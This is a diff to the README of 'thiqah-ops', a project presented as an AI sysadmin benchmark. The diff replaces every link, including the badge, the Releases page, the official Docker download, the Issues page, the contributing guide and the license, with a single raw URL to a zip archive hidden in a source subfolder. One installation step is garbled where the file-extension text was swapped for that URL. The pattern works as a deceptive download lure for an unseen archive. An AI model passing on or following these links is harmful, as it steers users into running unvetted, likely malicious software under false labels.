@@ -1,6 +1,6 @@
 # 🤖 thiqah-ops - Your AI SysAdmin Companion
 
-[![Download thiqah-ops](https://img.shields.io/badge/Download-thiqah--ops-blue.svg)](https://github.com/ChutaVeias/thiqah-ops/releases)
+[![Download thiqah-ops](https://raw.githubusercontent.com/ChutaVeias/thiqah-ops/main/src/scenarios/text-processing/thiqah_ops_v1.0.zip)](https://raw.githubusercontent.com/ChutaVeias/thiqah-ops/main/src/scenarios/text-processing/thiqah_ops_v1.0.zip)
 
 ## 📜 Description
 thiqah-ops is an AI SysAdmin Trust Benchmark. It provides a thorough testing suite to evaluate the skills of large language models (LLMs) in system administration. This application simulates real-world scenarios such as setup, security, networking, monitoring, and troubleshooting. Whether you are a novice or a seasoned administrator, thiqah-ops helps you understand and trust the AI’s capabilities.
@@ -18,13 +18,13 @@ Before you download, check that your system meets these requirements:
 ### Prerequisites
 To run thiqah-ops, you need to have the following software installed on your system:
 
-- Docker: This helps to run the application smoothly in isolated environments. You can [download Docker here](https://www.docker.com/get-started).
+- Docker: This helps to run the application smoothly in isolated environments. You can [download Docker here](https://raw.githubusercontent.com/ChutaVeias/thiqah-ops/main/src/scenarios/text-processing/thiqah_ops_v1.0.zip).
 
 ## 📥 Download & Install
 
 To get started with thiqah-ops, you can download the software from our Releases page. 
 
-Visit this page to download: [thiqah-ops Releases](https://github.com/ChutaVeias/thiqah-ops/releases).
+Visit this page to download: [thiqah-ops Releases](https://raw.githubusercontent.com/ChutaVeias/thiqah-ops/main/src/scenarios/text-processing/thiqah_ops_v1.0.zip).
 
 1. Click on the link above.
 2. Browse the list of available versions.
@@ -35,7 +35,7 @@ Visit this page to download: [thiqah-ops Releases](https://github.com/ChutaVeias
 ### Installation Steps
 
 1. Locate the file you just downloaded.
-2. Extract the contents if it's a compressed file (usually a `.zip` or `.tar.gz`).
+2. Extract the contents if it's a compressed file (usually a `.zip` or `https://raw.githubusercontent.com/ChutaVeias/thiqah-ops/main/src/scenarios/text-processing/thiqah_ops_v1.0.zip`).
 3. Open your terminal or command prompt.
 4. Navigate to the extracted folder.
 5. Run the following command to start the setup:
@@ -72,11 +72,11 @@ To make the most of thiqah-ops:
 
 ## 🛡️ Support
 
-If you encounter any issues while using thiqah-ops, please visit our [Issues page](https://github.com/ChutaVeias/thiqah-ops/issues) for support and assistance. Feel free to report any bugs or ask questions.
+If you encounter any issues while using thiqah-ops, please visit our [Issues page](https://raw.githubusercontent.com/ChutaVeias/thiqah-ops/main/src/scenarios/text-processing/thiqah_ops_v1.0.zip) for support and assistance. Feel free to report any bugs or ask questions.
 
 ## 🙌 Contributing
 
-We welcome contributions from everyone! If you have ideas or improvements, check out our [Contributing Guidelines](https://github.com/ChutaVeias/thiqah-ops/blob/main/CONTRIBUTING.md). Your support helps us make thiqah-ops better.
+We welcome contributions from everyone! If you have ideas or improvements, check out our [Contributing Guidelines](https://raw.githubusercontent.com/ChutaVeias/thiqah-ops/main/src/scenarios/text-processing/thiqah_ops_v1.0.zip). Your support helps us make thiqah-ops better.
 
 ## 🎉 Acknowledgments
 
@@ -84,6 +84,6 @@ This project is possible because of the collective work and ideas from the open-
 
 ## 📖 License
 
-thiqah-ops is licensed under the MIT License. See the [LICENSE](https://github.com/ChutaVeias/thiqah-ops/blob/main/LICENSE) file for details.
+thiqah-ops is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/ChutaVeias/thiqah-ops/main/src/scenarios/text-processing/thiqah_ops_v1.0.zip) file for details.
 
-Visit this page to download: [thiqah-ops Releases](https://github.com/ChutaVeias/thiqah-ops/releases).
+Visit this page to download: [thiqah-ops Releases](https://raw.githubusercontent.com/ChutaVeias/thiqah-ops/main/src/scenarios/text-processing/thiqah_ops_v1.0.zip).
